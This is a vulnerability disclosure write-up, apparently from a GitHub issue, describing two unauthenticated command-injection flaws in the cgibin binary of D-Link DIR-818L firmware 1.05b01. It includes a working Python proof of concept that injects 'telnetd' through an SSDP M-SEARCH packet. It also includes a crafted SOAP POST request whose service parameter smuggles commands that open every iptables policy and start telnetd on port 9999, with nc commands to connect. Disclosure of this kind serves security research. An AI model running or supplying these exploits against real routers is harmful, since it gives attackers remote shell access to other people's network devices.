# one
# Firmware:
DIR818L_FW105b01 A1:
# Detail:
Command execution exists in the cgibin binary
The ssdpcgi_main function has a command execution vulnerability caused by unfiltered parameters

![O)MM35GBCV_NA`DN}BHG)OB](https://user-images.githubusercontent.com/84966968/178105747-1dc9b8cc-6b03-48d4-bee0-f3c51414cc2c.png)

![KKMPAI5U05DZM145}(43`RU](https://user-images.githubusercontent.com/84966968/178105767-a5f75f13-cb88-4962-a31d-3feb8c7dc778.png)

lxmldbc_system：

![2O$$QJZ%6M@FEJUSVEU(7AF](https://user-images.githubusercontent.com/84966968/178105811-1e9c87dd-0b46-466c-a182-626da2fcff28.png)

You can see that the environment variables are concatenated directly into the system command without filtering
# poc：
```
import sys
import os
import socket
from time import sleep
def config_payload(ip, port):
    header = "M-SEARCH * HTTP/1.1\n"
    header += "HOST:"+str(ip)+":"+str(port)+"\n"
    header += "ST:urn:device:1;telnetd\n"
    header += "MX:2\n"
    header += 'MAN:"ssdp:discover"'+"\n\n"
    return header
def send_conexion(ip, port, payload):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
    sock.sendto(payload,(ip, port))
    sock.close()
if __name__== "__main__":
    ip = raw_input("Router IP: ")
    port = 1900

headers = config_payload(ip, port)
send_conexion(ip, port, headers)
sleep(5)
os.system('telnet ' + str(ip))
```
![0SOP(3D2535@D%$S4@UNTUP](https://user-images.githubusercontent.com/84966968/178105914-f00d0cdf-c38c-4e3c-9059-bd30cd36bf89.png)

I looked it up online and it looks like it's been there for a long time
# two
# Firmware:
DIR818L_FW105b01 A1:
# Detail:
Command execution exists in the cgibin binary
I found unauthenticated remote code execution vulnerability in function of binary.soapcgi_main

![WVG2G2 4{ZPVDJT H63_1GU](https://user-images.githubusercontent.com/84966968/178108334-f4b1b466-b613-4de8-901c-1cd9179e141a.png)

![HF@CU3E9~8YDFE3N 353GVQ](https://user-images.githubusercontent.com/84966968/178108325-989782f0-6e15-48d0-9432-97d9a5d33203.png)

Unfiltered functions result in being spliced into the system command
# poc:
```
#nc 192.168.0.1 49512

POST /soap.cgi?service=whatever-control;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -t nat -P PREROUTING ACCEPT;iptables -t nat -P OUTPUT ACCEPT;iptables -t nat -P POSTROUTING ACCEPT;telnetd -p 9999;whatever-invalid-shell HTTP/1.1
Host: 192.168.100.1:49152
Accept-Encoding: identity
Content-Length: 16
SOAPAction: "whatever-serviceType#whatever-action"
Content-Type: text/xml

```
We can see that port 9999 is opened

![6D2PDT$5JB Y)73YUU8PI)T](https://user-images.githubusercontent.com/84966968/178108466-7ed253de-518f-4ce6-b94b-a691381cc2c4.png)

```
nc 192.168.0.1 9999
```
![5%EK6 ~$P)UO}`4OT5HP2LR](https://user-images.githubusercontent.com/84966968/178108485-09ffc0fa-b8d5-4d45-b7f8-776922f1136a.png)

This bug is also a bug that has appeared in other versions
